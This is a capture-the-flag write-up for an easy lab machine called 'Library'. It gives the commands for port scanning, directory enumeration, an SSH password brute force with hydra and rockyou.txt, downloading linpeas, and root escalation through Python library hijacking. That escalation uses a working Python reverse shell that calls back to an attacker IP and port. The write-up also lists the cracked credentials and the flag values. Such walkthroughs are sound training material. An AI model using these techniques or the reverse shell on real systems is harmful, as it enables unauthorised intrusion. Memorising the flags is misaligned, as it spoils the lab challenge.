# Library - Easy

```shell
nmap -T4 -p- -A -v 10.10.46.49

feroxbuster -u http://10.10.46.49 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

hydra -l meliodas -P /usr/share/wordlists/rockyou.txt 10.10.46.49 ssh -t 30
#brute force ssh

ssh meliodas@10.10.46.49
#use password found

#get user flag

cd /tmp

#in attacker machine
python3 -m http.server

#in victim ssh
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

sudo -l
#we can run bak.py with Python as root

cd

cat bak.py

echo $PATH

#use python library hijacking method
#hijack the zipfile library
vi zipfile.py

cat zipfile.py

#setup listener in attacker machine
nc -nvlp 4445

#run the sudo command
sudo /usr/bin/python /home/meliodas/bak.py

#we get root shell at listener
```

```python
#!/usr/bin/env python
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.14.31.212",4445))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 80 - http - Apache httpd 2.4.18

* We can begin enumerating the webpage directories while exploring the webpage content.

* The webpage content seems to be just ipsum lorem text, but there are some directories and pages enumerated:

  * /logo.png
  * /images
  * /robots.txt

* /robots.txt has User-agent written as 'rockyou'; the /images and logo.png do not contain anything significant.

* As we have only one other service (ssh) accessible, and the clue 'rockyou' is given - maybe it is hinting towards ssh brute-forcing.

* From the webpage, we have the name of the author as 'meliodas', could be the user.

* Using ```hydra```, we can attempt to brute-force SSH using username 'meliodas' and wordlist rockyou.txt - and it works.

* We get the creds meliodas:iloveyou1 with the help of hydra, and now we can log into SSH.

* After getting user flag, we can begin enumeration - we can use linpeas.

* Using ```sudo -l```, we can run the following command as sudo:

  ```(ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py```

* Now, inspecting bak.py, we cannot modify the file, however we can note that the PATH variable contains our home directory.

* This means we can use Python library hijacking for privilege escalation.

* The bak.py script uses two libraries - os and zipfile - we can hijack any library by creating a malicious Python file of the same name.

* By inserting reverse shell code in Python (for Linux) in ```zipfile.py```, we can run the sudo command; and we will get reverse shell as root at our listener.

```markdown
1. user.txt - 6d488cbb3f111d135722c33cb635f4ec

2. root.txt - e8c8c6c256c35515d1d344ee0488c617
```
